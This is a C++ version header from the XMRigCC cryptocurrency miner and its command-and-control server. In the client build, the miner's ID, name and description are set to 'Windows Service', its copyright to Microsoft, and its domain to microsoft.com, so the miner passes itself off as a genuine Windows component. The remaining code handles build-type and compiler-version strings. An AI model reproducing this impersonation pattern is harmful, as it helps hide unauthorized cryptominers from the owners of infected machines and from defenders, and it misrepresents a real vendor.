#ifndef __VERSION_H__
#define __VERSION_H__

#ifdef XMRIG_CC_SERVER
#define APP_ID        "XMRigCC"
#define APP_NAME      "XMRigCC"
#define APP_DESC      "XMRigCC Command'n'Control Server"
#define APP_COPYRIGHT "Copyright (C) 2017- BenDr0id"
# else
#define APP_ID        "Windows Service"
#define APP_NAME      "Windows Service"
#define APP_DESC      "Windows Service"
#define APP_COPYRIGHT "Copyright (C) 2016-2018 Microsoft"
#endif
#define APP_VERSION   "Custom 2.4.5"
#define APP_DOMAIN    "microsoft.com"
#define APP_SITE      "www.microsoft.com"
#define APP_KIND      "cpu"

#define APP_VER_MAJOR  1
#define APP_VER_MINOR  6
#define APP_VER_BUILD  0
#define APP_VER_REV    0

#ifndef NDEBUG
	#ifndef XMRIG_NO_TLS
		#define BUILD_TYPE   "DEBUG with TLS"
	#else
		#define BUILD_TYPE   "DEBUG"	
	#endif	
#else
	#ifndef XMRIG_NO_TLS
		#define BUILD_TYPE   "RELEASE with TLS"
	#else
		#define BUILD_TYPE   "RELEASE"	
	#endif	
#endif

#ifdef _MSC_VER
#   if (_MSC_VER >= 1910)
#       define MSVC_VERSION 2017
#   elif _MSC_VER == 1900
#       define MSVC_VERSION 2015
#   elif _MSC_VER == 1800
#       define MSVC_VERSION 2013
#   elif _MSC_VER == 1700
#       define MSVC_VERSION 2012
#   elif _MSC_VER == 1600
#       define MSVC_VERSION 2010
#   else
#       define MSVC_VERSION 0
#   endif
#include <string>
#else
    #if defined(__FreeBSD__) || defined(__APPLE__)
        #include <string>
    #else
        #include <string.h>
    #endif
#endif




class Version
{
public:
    inline static std::string string()
    {
        std::string version = std::to_string(APP_VER_MAJOR) + std::string(".") + std::to_string(APP_VER_MINOR) +
                              std::string(".") + std::to_string(APP_VER_BUILD);

        return version;
    }

    inline static int code()
    {
        std::string version = std::to_string(APP_VER_MAJOR) + std::to_string(APP_VER_MINOR) + std::to_string(APP_VER_BUILD);

        return std::stoi(version);
    }
};
#endif /* __VERSION_H__ */
